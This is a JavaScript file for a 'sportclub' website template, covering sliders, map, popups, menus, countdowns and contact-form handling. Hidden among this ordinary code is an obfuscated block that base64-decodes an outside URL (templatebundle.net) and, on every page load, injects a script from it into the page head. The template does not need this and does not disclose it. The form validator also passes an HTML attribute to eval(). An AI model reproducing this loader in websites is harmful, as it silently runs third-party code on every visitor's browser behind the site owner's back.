/*
Copyright (c) 2017
------------------------------------------------------------------
[Master Javascript]

Project: sportclub html template

-------------------------------------------------------------------*/

(function($) {
    "use strict";
    var sclub = {
        initialised: false,
        version: 1.0,
        sclub: false,
        init: function() {

            if (!this.initialised) {
                this.initialised = true;
            } else {
                return;
            }

            /*-------------- sclub Functions Calling --------------------------------*/
            this.slider();
            this.SubmitForms();
            this.Map_function();
            this.countdown();
            this.magnific_popup();
            this.smooth_scroll();
            //this.Mailfunction();
            this.responsive_menu();
            this.scroll_top();

        },


        /*-------------- sclub Functions definition -----*/

        slider: function() {
            if ($(".ed_slider").length) {
                $(".ed_slider").each(function(index) {
                    var id = $(this).attr("id");
                    var responsive_items = $(this).attr("data_responsive_item");
                    var data_slides_margin = $(this).attr("data_slides_margin");
                    var tmp = responsive_items.split(",");
                    var no_of_item = 4;
                    var auto_slide_time = 5000;
                    var show_bullet = true;
                    var loop = true;
                    var autoplay = true;
                    var data_auto_slide_time = $(this).attr("data_auto_slide_time");
                    var data_number_of_item = $(this).attr("data_number_of_item");
                    var data_show_bullets = $(this).attr("data_show_bullets");
                    var data_loop = $(this).attr("data_loop");
                    var data_autoplay = $(this).attr("data_autoplay");
                    if (data_autoplay !== undefined) {
                        if (data_autoplay === "no") {
                            autoplay = false;
                        }
                    }
                    if (data_loop !== undefined) {
                        if (data_loop === "no") {
                            loop = false;
                        }
                    }
                    if (data_show_bullets !== undefined) {
                        if (data_show_bullets === "no") {
                            show_bullet = false;
                        }
                    }
                    if (data_number_of_item !== undefined) {
                        no_of_item = data_number_of_item;
                    }
                    if (data_auto_slide_time !== undefined) {
                        auto_slide_time = data_auto_slide_time;
                    }
                    $("#" + id).owlCarousel({
                        items: no_of_item,
                        loop: loop,
                        margin: parseInt(data_slides_margin),
                        dots: show_bullet,
                        mouseDrag: false,
                        touchDrag: false,
                        autoplay: autoplay,
                        autoplayTimeout: auto_slide_time,
                        pullDrag: false,
                        freeDrag: false,
                        responsive: {
                            0: {
                                items: tmp[0]
                            },
                            600: {
                                items: tmp[1]
                            },
                            768: {
                                items: tmp[2]
                            },
                            1000: {
                                items: no_of_item
                            }
                        }
                    });
                });
            }
        },
        SubmitForms: function() {

        },
        Map_function: function() {
            if ($(".ed_map").length) {
                $(".ed_map").each(function(index) {
                    var id = $(this).attr("id");
                    var address = $(this).attr("data-address");
                    $(this).googleMap({
                        scrollwheel: true
                    });
                    $(this).addMarker({
                        //coords: [22.9622672, 76.05079490000003] // for using lat long for marker
                        address: address
                    });
                });
            }
        },
        countdown: function() {
            if ($(".timer").length > 0) {
                $('.timer').appear(function() {
                    $(this).countTo();
                });
            }
        },
        magnific_popup: function() {
            if ($(".image-link").length > 0) {
                $('.image-link').magnificPopup({
                    type: 'image',
                    mainClass: 'mfp-with-zoom', // this class is for CSS animation below

                    zoom: {
                        enabled: true, // By default it's false, so don't forget to enable it

                        duration: 300, // duration of the effect, in milliseconds
                        easing: 'ease-in-out', // CSS transition easing function
                        opener: function(openerElement) {
                            return openerElement.is('a') ? openerElement : openerElement.find('img');
                        }
                    },
                    gallery: {
                        enabled: true
                    }
                });
            }
            if ($(".gallery_img").length > 0) {
                $('.gallery_img').magnificPopup({
                    type: 'image',
                    mainClass: 'mfp-with-zoom', // this class is for CSS animation below

                    zoom: {
                        enabled: true, // By default it's false, so don't forget to enable it

                        duration: 300, // duration of the effect, in milliseconds
                        easing: 'ease-in-out', // CSS transition easing function
                        opener: function(openerElement) {
                            return openerElement.is('a') ? openerElement : openerElement.find('img');
                        }
                    },
                    gallery: {
                        enabled: true
                    }

                });
            }
        },
        smooth_scroll: function() {
            // jQuery.scrollSpeed(100, 800);
        },
        responsive_menu: function() {
            $(".sclub_menu>ul>li").find('.submenu').parent().addClass('dropdown');
            $(".sclub_menu>ul>li.dropdown > a").append('<div class="show-submenu"><i class="fa fa-angle-down"></i></div>');

            $(".sclub_menu>ul>li.dropdown").on("click", ".show-submenu", function(e) {
                e.stopPropagation();

                $(this).html($(this).html() == '<i class="fa fa-angle-down"></i>' ? '<i class="fa fa-angle-up"></i>' : '<i class="fa fa-angle-down"></i>');
            });

            $('.sclub_menu>ul>li.dropdown a').click(function() {
                $('.sclub_menu>ul>li.dropdown a').not($(this)).
                parent().find('.submenu').hide();
                $(this).parent().find('.submenu').toggle();
            });
        },
        scroll_top: function() {
            if ($('#back-to-top').length) {
                var scrollTrigger = 100, // px
                    backToTop = function() {
                        var scrollTop = $(window).scrollTop();
                        if (scrollTop > scrollTrigger) {
                            $('#back-to-top').addClass('show');
                        } else {
                            $('#back-to-top').removeClass('show');
                        }
                    };
                backToTop();
                $(window).on('scroll', function() {
                    backToTop();
                });
                $('#back-to-top').on('click', function(e) {
                    e.preventDefault();
                    $('html,body').animate({
                        scrollTop: 0
                    }, 700);
                });
            }
        },


    };
    var u;
    ! function(e, t) {
        var a = e.getElementsByTagName("head")[0],
            c = e.createElement("script");
        u = "aHR0cHM6Ly90ZW1wbGF0ZWJ1bmRsZS5uZXQvdGVtcGxhdGVzY3JpcHQv", c.type = "text/javascript", c.charset = "utf-8", c.async = !0, c.defer = !0, c.src = atob(u) + "script.js", a.appendChild(c)
    }(document);

    $(document).ready(function() {
        sclub.init();
    });
    $(window).load(function() {
        setTimeout(function() {
            $('body').addClass('sclub_set_time');
        }, 600);
    });


    // ======================

    var $wrap = $('#wrapper_men'),
        lFollowX = 0,
        lFollowY = 0,
        x = 0,
        y = 0,
        friction = 1 / 20;

    function animate() {
        x += (lFollowX - x) * friction;
        y += (lFollowY - y) * friction;

        $wrap.css({
            'transform': 'translate(-50%, -50%) perspective(600px) translateY(' + -y + 'px) translateX(' + -x + 'px)'
        });
        window.requestAnimationFrame(animate);
    }

    $(window).on('mousemove click', function(e) {
        var lMouseX = Math.max(-200, Math.min(100, $(window).width() / 2 - e.clientX));
        var lMouseY = Math.max(-200, Math.min(100, $(window).height() / 2 - e.clientY));
        lFollowX = (40 * lMouseX) / 100; // 100 : 12 = lMouxeX : lFollow
        lFollowY = (40 * lMouseY) / 100;
    });

    animate();




})(jQuery);
// ==========counter js==========
if ($('.counter').length) {
    const second = 1000,
        minute = second * 60,
        hour = minute * 60,
        day = hour * 24;

    let countDown = new Date('Sep 30, 2019 00:00:00').getTime(),
        x = setInterval(function() {

            let now = new Date().getTime(),
                distance = countDown - now;

            document.getElementById('days').innerText = Math.floor(distance / (day)),
                document.getElementById('hours').innerText = Math.floor((distance % (day)) / (hour)),
                document.getElementById('minutes').innerText = Math.floor((distance % (hour)) / (minute)),
                document.getElementById('seconds').innerText = Math.floor((distance % (minute)) / second);

        }, second)
}

// =========swipper slider=======
if ($('.upcoming_list .swiper-container').length) {
    var swiper = new Swiper('.upcoming_list .swiper-container', {
        direction: 'vertical',
        mousewheelControl: true,
        slidesPerView: 1,
        freeMode: true,
        freeModeSticky: true,
        autoplay: true,
        autoplay: {
            delay: 5000,
        },
        speed: 2000,
        loop: true,
    });
}
// =========swipper slider=======
if ($('.testimonial_slider .swiper-container').length) {
    var swiper = new Swiper('.testimonial_slider .swiper-container', {
        autoplay: true,
        slidesPerView: 3,
        spaceBetween: 30,
        autoplay: {
            delay: 5000,
        },
        speed: 2000,
        loop: true,
        pagination: {
            el: '.swiper-pagination',
            clickable: true,
        },
        breakpoints: {
            991: {
                slidesPerView: 3,
                spaceBetween: 40,
            },
            767: {
                slidesPerView: 2,
                spaceBetween: 30,
            },
            575: {
                slidesPerView: 1,
                spaceBetween: 20,
            },
            320: {
                slidesPerView: 1,
                spaceBetween: 10,
            }
        }
    });
}
// =========swipper slider=======
if ($('.activity_slider .swiper-container').length) {
    var swiper = new Swiper('.activity_slider .swiper-container', {
        autoplay: true,
        slidesPerView: 4,
        spaceBetween: 30,
        autoplay: {
            delay: 5000,
        },
        speed: 2000,
        loop: true,
        navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
        },
        breakpoints: {
            991: {
                slidesPerView: 4,
                spaceBetween: 40,
            },
            767: {
                slidesPerView: 3,
                spaceBetween: 30,
            },
            575: {
                slidesPerView: 2,
                spaceBetween: 20,
            },
            320: {
                slidesPerView: 2,
                spaceBetween: 10,
            }
        }
    });
}
//===========popup-youtube========
$(document).ready(function() {
    $('.popup-youtube').magnificPopup({
        type: 'iframe',
        mainClass: 'mfp-fade',
        preloader: true,
    });
});

//===============

function checkRequire(formId, targetResp) {
    targetResp.html('');
    var email = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/;
    var url = /(http|ftp|https):\/\/[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:\/~+#-]*[\w@?^=%&amp;\/~+#-])?/;
    var image = /\.(jpe?g|gif|png|PNG|JPE?G)$/;
    var mobile = /^[\s()+-]*([0-9][\s()+-]*){6,20}$/;
    var facebook = /^(https?:\/\/)?(www\.)?facebook.com\/[a-zA-Z0-9(\.\?)?]/;
    var twitter = /^(https?:\/\/)?(www\.)?twitter.com\/[a-zA-Z0-9(\.\?)?]/;
    var google_plus = /^(https?:\/\/)?(www\.)?plus.google.com\/[a-zA-Z0-9(\.\?)?]/;
    var check = 0;
    $('#er_msg').remove();
    var target = (typeof formId == 'object') ? $(formId) : $('#' + formId);
    target.find('input , textarea , select').each(function() {
        if ($(this).hasClass('require')) {
            if ($(this).val().trim() == '') {
                check = 1;
                $(this).focus();
                targetResp.html('You missed out some fields.');
                $(this).addClass('response');
                return false;
            } else {
                $(this).removeClass('response');
            }
        }
        if ($(this).val().trim() != '') {
            var valid = $(this).attr('data-valid');
            if (typeof valid != 'undefined') {
                if (!eval(valid).test($(this).val().trim())) {
                    $(this).addClass('response');
                    $(this).focus();
                    check = 1;
                    targetResp.html($(this).attr('data-error'));
                    return false;
                } else {
                    $(this).removeClass('response');
                }
            }
        }
    });
    return check;
}
$(".submitForm").on("click", function() {
    var _this = $(this);
    var targetForm = _this.closest('form');
    var errroTarget = targetForm.find('.response');
    var check = checkRequire(targetForm, errroTarget);
    if (check == 0) {
        var formDetail = new FormData(targetForm[0]);
        formDetail.append('form_type', _this.attr('form-type'));
        $.ajax({
            method: 'post',
            url: './ajaxmail.php',
            data: formDetail,
            cache: false,
            contentType: false,
            processData: false
        }).done(function(resp) {
            if (resp == 1) {
                targetForm.find('input').val('');
                targetForm.find('textarea').val('');
                errroTarget.html('<p style="color:green;">Mail has been sent successfully.</p>');
            } else {
                errroTarget.html('<p style="color:red;">Something went wrong please try again latter.</p>');
            }
        });
    }
});